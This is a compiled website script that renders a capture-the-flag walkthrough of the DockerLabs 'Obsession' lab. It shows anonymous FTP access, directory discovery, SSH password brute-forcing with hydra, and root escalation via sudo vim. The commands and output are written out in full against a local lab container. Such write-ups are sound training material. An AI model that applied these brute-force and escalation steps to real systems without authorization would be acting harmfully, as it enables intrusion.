"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[88104],{52942:(n,e,s)=>{s.r(e),s.d(e,{assets:()=>d,contentTitle:()=>i,default:()=>p,frontMatter:()=>r,metadata:()=>t,toc:()=>c});const t=JSON.parse('{"id":"Independent-Environment/DockerLabs/Obsession/index","title":"Obsession","description":"Autor: Juan","source":"@site/docs/Independent-Environment/DockerLabs/Obsession/index.md","sourceDirName":"Independent-Environment/DockerLabs/Obsession","slug":"/Independent-Environment/DockerLabs/Obsession/","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/DockerLabs/Obsession/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Independent-Environment/DockerLabs/Obsession/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"Independent_Environment_Sidebar","previous":{"title":"Injection","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/DockerLabs/Injection/"},"next":{"title":"\u7eb5\u6a2a\u7f51\u7edc\u9776\u573a","permalink":"/Target-Machines-WriteUp/docs/category/Fengtaisec"}}');var o=s(74848),a=s(28453);const r={},i="Obsession",d={},c=[{value:"Deploy",id:"deploy",level:2},{value:"Scan",id:"scan",level:2},{value:"Port 21 FTP Anonymous",id:"port-21-ftp-anonymous",level:2},{value:"Port 80 Directory",id:"port-80-directory",level:2},{value:"Port 22 SSH Brute",id:"port-22-ssh-brute",level:2},{value:"\u63d0\u6743",id:"\u63d0\u6743",level:2}];function l(n){const e={admonition:"admonition",code:"code",h1:"h1",h2:"h2",header:"header",p:"p",pre:"pre",...(0,a.R)(),...n.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(e.header,{children:(0,o.jsx)(e.h1,{id:"obsession",children:"Obsession"})}),"\n",(0,o.jsxs)(e.admonition,{type:"info",children:[(0,o.jsx)(e.p,{children:"Autor: Juan"}),(0,o.jsx)(e.p,{children:"Dificultad: Muy F\xe1cil"}),(0,o.jsx)(e.p,{children:"Fecha de creaci\xf3n: 25/06/2024"})]}),"\n",(0,o.jsx)(e.h2,{id:"deploy",children:"Deploy"}),"\n",(0,o.jsx)(e.pre,{children:(0,o.jsx)(e.code,{className:"language-bash",children:'randark@developer:~$ docker load -i obsession.tar \n42d3f8788282: Loading layer [==================================================>]  78.74MB/78.74MB\n471e037e4e79: Loading layer [==================================================>]  348.7MB/348.7MB\n66915ced895f: Loading layer [==================================================>]  54.79MB/54.79MB\n3808d041be15: Loading layer [==================================================>]  3.679MB/3.679MB\nLoaded image: obsession:latest\nrandark@developer:~$ docker run -d --name obsession obsession\nee34974848d83c0fd618ba6f4778bc34c7adadd9d6611d4f0054ab4c96f61842\nrandark@developer:~$ docker inspect obsession | jq ".[0].NetworkSettings.Networks"\n{\n  "bridge": {\n    "IPAMConfig": null,\n    "Links": null,\n    "Aliases": null,\n    "MacAddress": "02:42:ac:11:00:03",\n    "DriverOpts": null,\n    "NetworkID": "9d2490a4389002f4858a8c1d1da879e98d0132d8ac103765241ea802bcbd9616",\n    "EndpointID": "b99fd25f0608b2574e1323c0abd8d32a8178081d00ce5c3bbb4cf42f743f1877",\n    "Gateway": "172.17.0.1",\n    "IPAddress": "172.17.0.3",\n    "IPPrefixLen": 16,\n    "IPv6Gateway": "",\n    "GlobalIPv6Address": "",\n    "GlobalIPv6PrefixLen": 0,\n    "DNSNames": null\n  }\n}\n'})}),"\n",(0,o.jsx)(e.h2,{id:"scan",children:"Scan"}),"\n",(0,o.jsx)(e.pre,{children:(0,o.jsx)(e.code,{className:"language-bash",children:"\u250c\u2500\u2500(randark\u327fkali)-[~]\n\u2514\u2500$ sudo proxychains -q nmap --min-rate=5000 -sT -A -p- 172.17.0.2\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-02-04 17:07 CST\nNmap scan report for 172.17.0.2\nHost is up (0.0022s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.5\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_Can't get directory listing: TIMEOUT\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to ::ffff:172.17.0.1\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 3\n|      vsFTPd 3.0.5 - secure, fast, stable\n|_End of status\n22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 60:05:bd:a9:97:27:a5:ad:46:53:82:15:dd:d5:7a:dd (ECDSA)\n|_  256 0e:07:e6:d4:3b:63:4e:77:62:0f:1a:17:69:91:85:ef (ED25519)\n80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))\n|_http-server-header: Apache/2.4.58 (Ubuntu)\n|_http-title: Russoski Coaching\n"})}),"\n",(0,o.jsx)(e.h2,{id:"port-21-ftp-anonymous",children:"Port 21 FTP Anonymous"}),"\n",(0,o.jsx)(e.pre,{children:(0,o.jsx)(e.code,{className:"language-bash",children:"randark@developer:~$ ftp 172.17.0.2\nConnected to 172.17.0.2.\n220 (vsFTPd 3.0.5)\nName (172.17.0.2:randark): Anonymous\n331 Please specify the password.\nPassword: \n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls -lah\n229 Entering Extended Passive Mode (|||51123|)\n150 Here comes the directory listing.\ndrwxr-xr-x    2 0        104          4096 Jun 18  2024 .\ndrwxr-xr-x    2 0        104          4096 Jun 18  2024 ..\n-rw-r--r--    1 0        0             667 Jun 18  2024 chat-gonza.txt\n-rw-r--r--    1 0        0             315 Jun 18  2024 pendientes.txt\n226 Directory send OK.\nftp> mget *\nmget chat-gonza.txt [anpqy?]? y\n229 Entering Extended Passive Mode (|||63098|)\n150 Opening BINARY mode data connection for chat-gonza.txt (667 bytes).\n100% |*******************************************************************************************************************************************************************|   667      245.05 KiB/s    00:00 ETA\n226 Transfer complete.\n667 bytes received in 00:00 (189.46 KiB/s)\nmget pendientes.txt [anpqy?]? y\n229 Entering Extended Passive Mode (|||19035|)\n150 Opening BINARY mode data connection for pendientes.txt (315 bytes).\n100% |*******************************************************************************************************************************************************************|   315      282.73 KiB/s    00:00 ETA\n226 Transfer complete.\n315 bytes received in 00:00 (235.18 KiB/s)\nftp> exit\n221 Goodbye.\n"})}),"\n",(0,o.jsx)(e.pre,{children:(0,o.jsx)(e.code,{className:"language-plaintext",metastring:'title="chat-gonza.txt"',children:"[16:21, 16/6/2024] Gonza: pero en serio es tan guapa esa tal N\xe1gore como dices?\n[16:28, 16/6/2024] Russoski: es una aut\xe9ntica princesa pff, le he hecho hasta un v\xeddeo y todo, lo tengo ya subido y tengo la URL guardada\n[16:29, 16/6/2024] Russoski: en mi ordenador en una ruta segura, ahora cuando quedemos te lo muestro si quieres\n[21:52, 16/6/2024] Gonza: buah la verdad ten\xedas raz\xf3n eh, es hermosa esa chica, del 9 no baja\n[21:53, 16/6/2024] Gonza: por cierto buen entreno el de hoy en el gym, noto los brazos bastante hinchados, as\xed s\xed\n[22:36, 16/6/2024] Russoski: te lo dije, ya sabes que yo tengo buenos gustos para estas cosas xD, y s\xed buen training hoy\n"})}),"\n",(0,o.jsx)(e.pre,{children:(0,o.jsx)(e.code,{className:"language-plaintext",metastring:'title="pendientes.txt"',children:"1 Comprar el Voucher de la certificaci\xf3n eJPTv2 cuanto antes!\n\n2 Aumentar el precio de mis asesor\xedas online en la Web!\n\n3 Terminar mi laboratorio vulnerable para la plataforma Dockerlabs!\n\n4 Cambiar algunas configuraciones de mi equipo, creo que tengo ciertos\n  permisos habilitados que no son del todo seguros..\n"})}),"\n",(0,o.jsx)(e.h2,{id:"port-80-directory",children:"Port 80 Directory"}),"\n",(0,o.jsx)(e.pre,{children:(0,o.jsx)(e.code,{className:"language-bash",children:"[22:45:08] 301 -  309B  - /backup  ->  http://172.17.0.2/backup/\n[22:45:08] 200 -  453B  - /backup/\n"})}),"\n",(0,o.jsx)(e.p,{children:"\u5728\u5176\u4e2d\u5f97\u5230\u4e00\u4e2atxt\u6587\u4ef6"}),"\n",(0,o.jsx)(e.pre,{children:(0,o.jsx)(e.code,{className:"language-plaintext",metastring:'title="http://172.17.0.2/backup/backup.txt"',children:"Usuario para todos mis servicios: russoski (cambiar pronto!)\n"})}),"\n",(0,o.jsx)(e.h2,{id:"port-22-ssh-brute",children:"Port 22 SSH Brute"}),"\n",(0,o.jsx)(e.p,{children:"\u5c1d\u8bd5\u4f7f\u7528Hydra\u6765\u8fdb\u884c\u7206\u7834"}),"\n",(0,o.jsx)(e.pre,{children:(0,o.jsx)(e.code,{className:"language-bash",children:"\u250c\u2500\u2500(randark\u327fkali)-[~]\n\u2514\u2500$ proxychains -q hydra -l russoski -P /usr/share/wordlists/rockyou.txt -V -I -f ssh://172.17.0.2\n......\n[22][ssh] host: 172.17.0.2   login: russoski   password: iloveme\n"})}),"\n",(0,o.jsx)(e.p,{children:"\u6210\u529f\u5f97\u5230\u4e86SSH\u7684\u51ed\u636e"}),"\n",(0,o.jsx)(e.pre,{children:(0,o.jsx)(e.code,{className:"language-bash",children:"\u250c\u2500\u2500(randark\u327fkali)-[~]\n\u2514\u2500$ proxychains ssh russoski@172.17.0.2\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] Strict chain  ...  127.0.0.1:10000  ...  172.17.0.2:22  ...  OK\nrussoski@172.17.0.2's password: \nWelcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.0-51-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/pro\n\nThis system has been minimized by removing packages and content that are\nnot required on a system that users do not log into.\n\nTo restore this content, you can run the 'unminimize' command.\nLast login: Tue Jun 18 04:38:10 2024 from 172.17.0.1\nrussoski@13b39f2b1c3b:~$ whoami\nrussoski\n"})}),"\n",(0,o.jsx)(e.h2,{id:"\u63d0\u6743",children:"\u63d0\u6743"}),"\n",(0,o.jsx)(e.pre,{children:(0,o.jsx)(e.code,{className:"language-bash",children:"russoski@13b39f2b1c3b:~$ sudo /usr/bin/vim -c ':!/bin/bash'\n\nroot@13b39f2b1c3b:/home/russoski# whoami\nroot\n"})})]})}function p(n={}){const{wrapper:e}={...(0,a.R)(),...n.components};return e?(0,o.jsx)(e,{...n,children:(0,o.jsx)(l,{...n})}):l(n)}},28453:(n,e,s)=>{s.d(e,{R:()=>r,x:()=>i});var t=s(96540);const o={},a=t.createContext(o);function r(n){const e=t.useContext(a);return t.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function i(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(o):n.components||o:r(n.components),t.createElement(a.Provider,{value:e},n.children)}}}]);